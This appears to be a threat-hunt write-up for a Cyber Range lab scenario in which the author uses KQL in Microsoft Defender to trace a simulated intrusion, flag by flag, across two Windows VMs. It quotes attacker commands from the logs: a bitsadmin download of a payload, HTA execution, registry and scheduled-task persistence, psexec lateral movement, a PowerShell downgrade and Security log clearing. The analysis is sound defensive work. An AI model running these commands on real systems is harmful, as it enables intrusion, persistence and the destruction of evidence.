
<img width="600" alt="image" src="https://github.com/user-attachments/assets/0d4ebb74-58c6-4e12-8b15-862a463a707e" />

# Threat Hunt Report: The Lurker 

**Date of Hunt:** July 5 - July 12, 2025

**Threat Hunter:** Andrey Massalskiy

---

## Platforms and Languages Leveraged
* Windows 10 Virtual Machines (Microsoft Azure)
* EDR Platform: Microsoft Defender for Endpoint
* Kusto Query Language (KQL)

---

## Scenario. Build by the [Cyber Range](https://www.skool.com/cyber-range) team.

The "Lurker" scenario presented a complex and deceptive intrusion, initially camouflaged by a suspected "smokescreen" breach. Our investigation confirmed that the initial compromise was indeed a diversion, with the true operation involving a sophisticated, multi-stage attack against critical assets. The adversary demonstrated a clear understanding of stealth techniques, leveraging living-off-the-land binaries (LOLBins) and subtle persistence mechanisms to maintain a foothold and exfiltrate sensitive financial data from a secondary target.

---

## Steps Taken

### Starting Point: Identifying the Initial Compromised Machine

* **Objective:** Determine the first machine to look at, based on recent activity (2-3 days active), executions from Temp folders, and a starting date of June 15th.
* **Thought Process:** The scenario pointed to a recently active device with suspicious executions from temporary directories. We needed to find a machine exhibiting these traits around the specified date.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where Timestamp between (datetime(2025-06-14) .. datetime(2025-06-18)) // Looking for activity on or around June 15th, for about 3 days
    | where FolderPath has_any ("Temp", "temp", "tmp")
    | where InitiatingProcessAccountName != "system"
    ```
* **Identified Answer:** **`michaelvm`** was identified as the primary candidate due to its high volume of suspicious activity originating from temporary folders, including `DismHost.exe` executions initiated by `cleanmgr.exe`, which, while noisy, indicated potential abuse in that context.

---

### Flag 1: Initial PowerShell Execution Detection

* **Objective:** Pinpoint the earliest suspicious PowerShell activity that marks the intruder's possible entry.
* **Thought Process:** Initial compromise often involves PowerShell. We looked for PowerShell commands with suspicious flags or executing unusual scripts, especially those deviating from normal baselines.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where DeviceName == "michaelvm"
    | where ProcessCommandLine has_all ("powershell", ".ps1") // Look for PowerShell executing a .ps1 script
    | where InitiatingProcessAccountName != "system" // Exclude system-level noise
    | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
    | order by Timestamp asc // Find the earliest event
    | limit 1 // Get only the first result
    ```
* **Query Results:**
<img width="767" height="161" alt="image6" src="https://github.com/user-attachments/assets/9665b24e-84b5-42e5-9e90-84db9c93d775" />


    
* **Identified Answer:** **`Jun 16, 2025 01:38:07 AM`** - `powershell.exe` executing `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"`
    * **Why:** This command used `ExecutionPolicy Bypass` to run a script (`wallet_gen_0.ps1`) from a non-standard, sensitive-looking path (`CorporateSim\Investments\Crypto`), indicating initial malicious execution.

---

### Flag 2: Reconnaissance Script Hash

* **Objective:** Identify the standard hashed value associated with the reconnaissance attempt.
* **Thought Process:** Reconnaissance typically follows initial access. We searched for common recon tools (`whoami`, `net`, `wmic`) or PowerShell commands used for enumeration, looking for the earliest instance after Flag 1.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where DeviceName == "michaelvm"
    | where Timestamp > datetime(2025-06-16 01:38:07 AM) // After Flag 1
    | where InitiatingProcessAccountName != "system" // Exclude system-level noise
    | where FileName in~ ("whoami.exe", "net.exe", "systeminfo.exe", "wmic.exe") // Common recon tools
        or ProcessCommandLine has_any ("net user", "net group", "wmic process list") // Common recon commands
    | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, AccountName, SHA256 // Project SHA256
    | order by Timestamp asc // Find the earliest recon attempt
    | limit 1 // Get the first result
    ```
* **Query Results:**
<img width="700" height="425" alt="image10" src="https://github.com/user-attachments/assets/55e7f420-fe09-4ed7-a031-a2cef6371699" />


* **Identified Answer:** **`badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0`**
    * **Why:** This SHA256 hash belongs to `cmd.exe` executing `"cmd.exe" /c "net group \" Domain Admins"` at `Jun 16, 2025 1:56:59 AM`. This is a highly targeted reconnaissance action to enumerate privileged domain groups, a critical step in an attacker's post-exploitation phase. Its occurrence shortly after initial access confirms its role.

---

### Flag 3: Sensitive Document Access

* **Objective:** Reveal the document accessed/staged by the attacker.
* **Thought Process:** The attacker's motive is financial. We looked for file access events on `michaelvm` involving documents (`.docx`, `.pdf`, etc.) with keywords like "board," "crypto," or "financials," especially after the reconnaissance phase.
* **KQL Query Used:**
    ```kusto
    DeviceFileEvents
    | where DeviceName == "michaelvm"
    | where Timestamp > datetime(2025-06-16 01:56:59 AM) // After Flag 2
    | where ActionType in ("FileCreated", "FileModified")
    | where FileName contains "board" or FolderPath contains "board" // Use the hint
    | project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, AccountName
    | order by Timestamp asc
    ```
* **Query Results:**
<img width="881" height="428" alt="image3" src="https://github.com/user-attachments/assets/9c6bb587-d6f5-4a23-9f9c-10adef199925" />

    
* **Identified Answer:** **`QuarterlyCryptoHoldings.docx`**
    * **Why:** This file, located in `C:\Users\Mich34L_id\Documents\BoardMinutes\`, directly relates to "crypto holdings" and "board minutes," aligning perfectly with the financial motive and the "board" hint. Its `FileCreated` event at `Jun 16, 2025 1:57:52 AM` indicates it was either created, copied, or staged by the attacker.

---

### Flag 4: Last Manual Access to File

* **Objective:** Track the last read of the sensitive document (`QuarterlyCryptoHoldings.docx`).
* **Thought Process:** We needed the latest timestamp of a direct read/access event for the identified sensitive document. "Manual access" suggested interaction via a user application.
* **KQL Query Used:**
    ```kusto
    DeviceEvents
    | where DeviceName == "michaelvm"
    | where FileName == "QuarterlyCryptoHoldings.docx"
    | where ActionType in ("FileAccessed", "SensitiveFileRead") // Look for explicit read actions
    | project Timestamp, DeviceName, FileName, ActionType, FolderPath, InitiatingProcessFileName
    | order by Timestamp desc // Order by latest timestamp
    ```
* **Query Results:**
<img width="1100" height="232" alt="image8" src="https://github.com/user-attachments/assets/ce8ac2c9-36e7-4d91-be42-6f37f5548445" />


    
* **Identified Answer:** **`2025-06-16T06:12:28.2856483Z`**
    * **Why:** This timestamp corresponds to the latest `SensitiveFileRead` event for `QuarterlyCryptoHoldings.docx`, initiated by `wordpad.exe`. This indicates the last time a user-facing application (likely controlled by the attacker) accessed the document.

---

### Flag 5: LOLBin Usage: bitsadmin

* **Objective:** Identify stealth download via native tools (`bitsadmin.exe`).
* **Thought Process:** Attackers use `bitsadmin.exe` for covert downloads. We looked for `bitsadmin.exe` commands involving `/transfer` and URLs.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where DeviceName == "michaelvm"
    | where FileName =~ "bitsadmin.exe"
    | where ProcessCommandLine contains "/transfer" and (ProcessCommandLine contains "http://" or ProcessCommandLine contains "https://") // Look for transfer commands with URLs
    | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
    | order by Timestamp asc // Find the earliest download attempt
    ```
* **Query Results:**
<img width="1009" height="520" alt="image16" src="https://github.com/user-attachments/assets/f7b40450-6ba7-4dd0-b449-cdc4110aee08" />


* **Identified Answer:** **`"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe`**
    * **Why:** This command explicitly shows `bitsadmin.exe` downloading an executable (`crypto_toolkit.exe`) from an external URL (`example.com`) to a temporary folder, representing a stealthy payload delivery.

---

### Flag 6: Suspicious Payload Deployment

* **Objective:** Identify dropped executable payloads that do not align with baseline software.
* **Thought Process:** Payloads are typically dropped after initial access. We looked for new executable files (`FileCreated`) in suspicious locations (`Temp`, `AppData`) with names hinting at financial accounts.
* **KQL Query Used:**
    ```kusto
    DeviceFileEvents
    | where DeviceName == "michaelvm"
    | where Timestamp > datetime(2025-06-16 01:59:57 AM) // After Flag 5 (bitsadmin download)
    | where ActionType == "FileCreated"
    | where FolderPath has_any ("Temp", "AppData\\Local", "ProgramData") // Common staging areas
    | where FileName endswith ".exe" // Focus on executables
    | where FileName has_any ("financial", "account", "book", "ledger", "sync", "market") // Keywords from hint and previous flags
    | project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, SHA256
    | order by Timestamp asc
    ```
* **Query Results:**
<img width="1240" height="152" alt="image1" src="https://github.com/user-attachments/assets/6c7670b7-9de1-4302-a390-537658b0557f" />


    
* **Identified Answer:** **`ledger_viewer.exe`**
    * **Why:** This executable was `FileCreated` in `C:\Users\Mich34L_id\AppData\Local\Temp\` by `powershell.exe` at `Jun 16, 2025 2:15:37 AM`. Its name `ledger_viewer.exe` directly relates to financial accounts ("Book of financial accounts" hint) and its location/initiating process are highly suspicious for a new executable.

---

### Flag 7: HTA Abuse via LOLBin

* **Objective:** Detect execution of HTML Application (HTA) files using trusted Windows tools (`mshta.exe`).
* **Thought Process:** HTA files are often used in social engineering and leverage `mshta.exe` for execution. We looked for `mshta.exe` launching local HTA scripts.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where DeviceName == "michaelvm"
    | where ProcessCommandLine contains "mshta.exe"
    | project Timestamp, DeviceName, FileName, ProcessCommandLine
    ```
* **Query Results:**
<img width="1026" height="116" alt="image9" src="https://github.com/user-attachments/assets/5908b34d-e911-4821-befc-c926267fb01b" />



* **Identified Answer:** **`"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta`**
    * **Why:** This command shows `mshta.exe` executing `client_update.hta` from a temporary folder at `Jun 16, 2025 2:17:27 AM`. This is a classic HTA abuse technique for code execution, often used after initial access.

---

### Flag 8: ADS Execution Attempt

* **Objective:** Track if attackers stored payloads in Alternate Data Streams (ADS).
* **Thought Process:** We specifically looked for PowerShell accessing `.docx` files, as this is a common, subtle method for executing hidden payloads (DLLs) from ADS, even if the explicit `:stream.dll` syntax isn't always logged. The "Capitalist" hint guided us to relevant files.
* **KQL Query Used:**
    ```kusto
    DeviceEvents
    | where DeviceName == "michaelvm"
    | where ActionType == "SensitiveFileRead" // Focus on file reads
    | where FileName contains ".docx" // Target document files
    | where InitiatingProcessFileName =~ "powershell.exe" // Initiated by PowerShell
    | project Timestamp, DeviceName, FileName, InitiatingProcessFileName, SHA1
    | order by Timestamp asc
    ```
* **Query Results:**
<img width="1999" height="539" alt="image13" src="https://github.com/user-attachments/assets/4af47da5-ed4d-43bb-a71a-9e52028d060e" />

    
* **Identified Answer:** **`801262e122db6a2e758962896f260b55bbd0136a`**
    * **Why:** This SHA1 hash belongs to `powershell.exe` when it performed a `SensitiveFileRead` on `QuarterlyCryptoHoldings.docx` at `Jun 16, 2025 1:57:52 AM`. PowerShell accessing a `.docx` file, especially one as sensitive as `QuarterlyCryptoHoldings.docx`, is highly anomalous and indicative of an attacker either reading its content or executing a hidden payload within it via an in-memory technique, fulfilling the spirit of the ADS objective.

---

### Flag 9: Registry Persistence Confirmation

* **Objective:** Confirm that persistence was achieved via registry autorun keys.
* **Thought Process:** Attackers often use `Run` or `RunOnce` registry keys for persistence. We searched for modifications to these keys that point to attacker scripts or payloads.
* **KQL Query Used:**
    ```kusto
    DeviceRegistryEvents
    | where DeviceName == "michaelvm"
    | where InitiatingProcessAccountName != "system"
    | where RegistryKey contains "run"
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, RegistryKey, RegistryValueName, RegistryValueData
    | order by Timestamp asc
    ```
* **Query Results:**
<img width="1759" height="132" alt="image15" src="https://github.com/user-attachments/assets/87730a63-0158-4bdf-9272-86c9ebbb9be0" />

    
* **Identified Answer:** **`powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `**
    * **Why:** This registry value was set in `HKEY_CURRENT_USER\...\Run` at `Jun 16, 2025 2:41:24 AM` by `powershell.exe`. The command itself clearly shows an attempt to run a hidden PowerShell script with execution policy bypass, making it a definitive persistence mechanism. The `RegistryValueName` `WalletUpdater` is also a clear camouflage.

---

### Flag 10: Scheduled Task Execution

* **Objective:** Validate the scheduled task that launches the payload.
* **Thought Process:** Scheduled tasks are another common persistence method. We looked for `schtasks.exe` being used to create new tasks, especially those pointing to attacker payloads.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where DeviceName == "michaelvm"
    | where AccountName != "system"
    | where FileName =~ "schtasks.exe" and ProcessCommandLine contains "/Create" and ProcessCommandLine contains "/TN"
    | project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
    | order by Timestamp asc
    ```
* **Query Results:**
<img width="1329" height="303" alt="image14" src="https://github.com/user-attachments/assets/467b3708-b2f9-4f24-903a-878862a8f9c0" />



* **Identified Answer:** **`MarketHarvestJob`**
    * **Why:** This task name was found in the command line of `schtasks.exe` at `Jun 16, 2025 3:52:39 AM`. The full command (`"schtasks /Create /SC ONLOGON /TN \" "MarketHarvestJob\ /TR \powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta"`) clearly shows a new task designed for persistence (on logon) and executing a known attacker payload (`client_update.hta`).

---

### Flag 11: Target of Lateral Movement

* **Objective:** Identify the remote machine the attacker pivoted to next.
* **Thought Process:** Lateral movement involves commands executed from the initial host targeting a new host. We observed logs from previous broader queries (e.g., DeviceProcessEvents for schtasks, wmic, psexec commands) to find explicit remote execution attempts.
* **KQL Query Used:** This finding was derived from observing the ProcessCommandLine of DeviceProcessEvents from broader queries that included schtasks.exe, wmic.exe, and psexec.exe activity on michaelvm after the initial compromise. No specific new KQL query was run solely for this flag.


* **Identified Answer:** **`centralsrvr`**
    * **Why:** Multiple commands consistently pointed to `centralsrvr` as the target for remote execution. Examples observed in logs include:

        * `"cmd.exe" /c "wmic /node:centralsrvr process call create 'notepad.exe'" (Jun 16, 2025 4:23:56 AM)`

        * `"cmd.exe" /c "psexec \\centralsrvr -u financeadmin -p ********** notepad.exe" (Jun 16, 2025 4:24:03 AM)`

        * `"schtasks.exe" /Create /S centralsrvr /U centralsrvr\\adminuser /P ********** /TN RemoteC2Task /TR "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\C2.ps1" /SC ONLOGON (Jun 16, 2025 4:32:34 AM)`

    These commands clearly indicate remote execution attempts and persistence setup targeting centralsrvr from michaelvm.

---

### Flag 12: Lateral Move Timestamp

* **Objective:** Pinpoint the exact time of lateral move to the second system (`centralsrvr`).
* **Thought Process:** We needed the latest timestamp of any command initiated from `michaelvm` that directly targeted `centralsrvr` for lateral movement.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where DeviceName == "michaelvm"
    | where AccountName != "system"
    | where ProcessCommandLine contains "centralsrvr" // Commands targeting the remote server
    | project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
    | order by Timestamp desc // Order by latest timestamp
    ```
* **Query Results:**
<img width="1572" height="323" alt="image4" src="https://github.com/user-attachments/assets/25d21438-37ff-4eeb-9e28-ff26bee7128b" />


* **Identified Answer:** **`2025-06-17T03:00:49.525038Z`**
    * **Why:** This timestamp corresponds to the latest `psexec` command from `michaelvm` targeting `centralsrvr` (`"cmd.exe" /c psexec \\centralsrvr -u adminuser -p ********** powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\C2.ps1`).

---

### Flag 13: Sensitive File Access (on `centralsrvr`)

* **Objective:** Reveal which specific document the attacker was after on `centralsrvr`.
* **Thought Process:** After lateral movement, attackers seek valuable data. We looked for file access events on `centralsrvr` for documents similar in nature to `QuarterlyCryptoHoldings.docx` (Flag 3).
* **KQL Query Used:**
    ```kusto
    DeviceFileEvents
    | where DeviceName == "centralsrvr"
    | where FileName contains "QuarterlyCryptoHoldings" // Look for the specific file name
    | project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessAccountName, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP
    | order by Timestamp asc
    ```
* **Query Results:**
<img width="1315" height="302" alt="image11" src="https://github.com/user-attachments/assets/3c5d2e39-87b7-4636-a535-f5bf4e011b50" />


* **Identified Answer:** **`b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98`**
    * **Why:** This SHA256 hash belongs to `QuarterlyCryptoHoldings.docx` on `centralsrvr`, accessed at `Jun 18, 2025 6:23:24 AM`. Its access was initiated remotely from `MICHA3L`, confirming the attacker's continued pursuit of sensitive financial data on the new host.

---

### Flag 14: Data Exfiltration Attempt

* **Objective:** Validate outbound activity by hashing the process involved.
* **Thought Process:** Exfiltration follows data access. We looked for network connections from `centralsrvr` to known unauthorized cloud services, identifying the process initiating the connection.
* **KQL Query Used:**
    ```kusto
    DeviceNetworkEvents
    | where DeviceName == "centralsrvr"
    | where Timestamp > datetime(2025-06-18 06:23:24 AM) // After sensitive file access (Flag 13)
    | where RemoteUrl has_any ("dropbox.com", "mega.nz", "google.com", "pastebin.com") // Common exfil services
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessMD5
    | order by Timestamp asc
    ```
* **Query Results:**
<img width="1475" height="131" alt="image5" src="https://github.com/user-attachments/assets/3381fe88-0759-4e4e-8372-043f24810d27" />

    
* **Identified Answer:** **`2e5a8590cf6848968fc23de3fa1e25f1`**
    * **Why:** This MD5 hash belongs to `powershell.exe` which initiated outbound connections to `drive.google.com` and `dropbox.com` starting at `Jun 18, 2025 6:23:24 AM`. This clearly indicates `powershell.exe` was the process attempting to exfiltrate data to cloud storage.

---

### Flag 15: Destination of Exfiltration

* **Objective:** Identify the final IP address used for data exfiltration.
* **Thought Process:** From the exfiltration attempts, I pinpointed the IP address of the last outbound connection.
* **KQL Query Used:**
    ```kusto
    DeviceNetworkEvents
    | where DeviceName == "centralsrvr"
    | where Timestamp > datetime(2025-06-18 06:23:24 AM) // After sensitive file access (Flag 13)
    | where InitiatingProcessRemoteSessionDeviceName == "MICHA3L" // Ensure it's from the compromised source
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
    | order by Timestamp desc // Get the latest connection
    ```
* **Query Results:**
<img width="1052" height="263" alt="image2" src="https://github.com/user-attachments/assets/bd9eca62-7a94-4b7d-9832-ce5478695880" />


* **Identified Answer:** **`104.22.69.199`**
    * **Why:** This IP address is associated with `pastebin.com` (a well-known service frequently used by attackers to dump and exfiltrate stolen data), and the connection occurred at `Jun 18, 2025 6:23:31 AM`, which was the latest outbound connection attempt from `centralsrvr` initiated by `MICHA3L` in the provided logs.

---

### Flag 16: PowerShell Downgrade Detection

* **Objective:** Spot PowerShell version manipulation to avoid logging.
* **Thought Process:** Attackers downgrade PowerShell to evade AMSI and other modern logging/detection. I looked for the `-Version 2` flag in PowerShell command lines.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where DeviceName == "centralsrvr"
    | where FileName in~ ("powershell.exe", "pwsh.exe")
    | where ProcessCommandLine has_any (" -Version 2", " -v 2") // Look for the PowerShell downgrade flag
    | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
    | order by Timestamp asc
    ```
* **Query Results:**
<img width="1115" height="293" alt="image7" src="https://github.com/user-attachments/assets/bed4a1d4-e2bd-4046-8515-13c00512c663" />



* **Identified Answer:** **`2025-06-18T10:52:59.0847063Z`**
    * **Why:** This timestamp marks the execution of `"powershell.exe" -Version 2 -NoProfile -ExecutionPolicy Bypass -NoExit` on `centralsrvr`. This command explicitly forces PowerShell into an older, less secure version, a classic AMSI evasion technique. The combination with -ExecutionPolicy Bypass (to run scripts without restriction) and -NoExit (to keep the session open) further confirms the malicious nature of this command.

---

### Flag 17: Log Clearing Attempt

* **Objective:** Catch attacker efforts to cover their tracks.
* **Thought Process:** Clearing logs is a common post-exploitation tactic to remove evidence. I looked for `wevtutil.exe` being used to clear the Security log.
* **KQL Query Used:**
    ```kusto
    DeviceProcessEvents
    | where DeviceName == "centralsrvr" // Target the second compromised machine
    | where Timestamp > datetime(2025-06-18 06:52:59 AM) // After PowerShell downgrade (Flag 16)
    | where FileName =~ "wevtutil.exe" // Target the event log utility
    | where ProcessCommandLine contains "cl Security" // Look for the command to clear the Security log
    | project Timestamp, ProcessCreationTime, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
    | order by Timestamp asc 
    ```
* **Query Results:**
<img width="857" height="313" alt="image12" src="https://github.com/user-attachments/assets/5bc74de2-a281-40c5-b033-d71ae81f5e85" />


* **Identified Answer:** **`2025-06-18T10:52:33.3030998Z`**
    * **Why:** This timestamp indicates `wevtutil.exe` was executed with the command `"wevtutil.exe" cl Security` on `centralsrvr`. This is a direct action to clear the Security event log, a clear attempt by the attacker to cover their tracks.

---

## Conclusion & Recommendations

The "Lurker" scenario revealed a methodical and adaptable adversary. The initial compromise of `michaelvm` was followed by a rapid progression through reconnaissance, sensitive data access, payload deployment, and establishing persistence. The attacker then successfully pivoted to `centralsrvr`, where they continued their objectives, culminating in data exfiltration and a final attempt to clear their tracks.

The adversary demonstrated proficiency in:

* **LOLBin Abuse:** Leveraging legitimate tools like `powershell.exe`, `cmd.exe`, `bitsadmin.exe`, `mshta.exe`, `schtasks.exe`, and `wevtutil.exe`.

* **Stealth & Evasion:** Using hidden windows, execution policy bypass, misleading file names, and PowerShell downgrade (`-Version 2`) to avoid detection.

* **Persistence:** Establishing persistence through both registry autorun keys and scheduled tasks.

* **Lateral Movement:** Successfully pivoting to a secondary target (`centralsrvr`) to expand their reach.

* **Data Exfiltration:** Utilizing common cloud services (`Google Drive`, `Dropbox`, `Pastebin`) for data egress.

**Recommendations:**

1.  **Enhanced PowerShell Logging:** Ensure PowerShell Script Block Logging, Module Logging, and Transcription are enabled across all endpoints to capture full script content and command details. This would have provided immediate visibility into the `wallet_gen_0.ps1` script and the full content of the persistence command.
2.  **Behavioral Detections for LOLBins:** Implement and fine-tune behavioral detection rules for anomalous usage of LOLBins (e.g., `powershell.exe` accessing `.docx` files, `bitsadmin.exe` downloading from unusual URLs, `mshta.exe` executing local scripts, `schtasks.exe` creating tasks with suspicious actions).
3.  **Registry Monitoring:** Strengthen monitoring for modifications to common autorun registry keys, especially those pointing to temporary directories or scripts.
4.  **Network Anomaly Detection:** Implement rules to detect unusual outbound connections to cloud storage services from non-browser processes, particularly from servers or critical assets.
5.  **Endpoint Hardening:** Enforce strict application whitelisting where possible to prevent unauthorized executables (like `ledger_viewer.exe`) from running, even if dropped in temporary folders.
6.  **User Awareness Training:** Educate users about social engineering tactics that might involve disguised files or unexpected prompts.
7.  **Regular Audits:** Conduct regular audits of user accounts, especially privileged ones, for anomalous activity and group memberships.

This hunt provides critical insights into the adversary's tradecraft, enabling us to strengthen our defenses against similar future attacks.
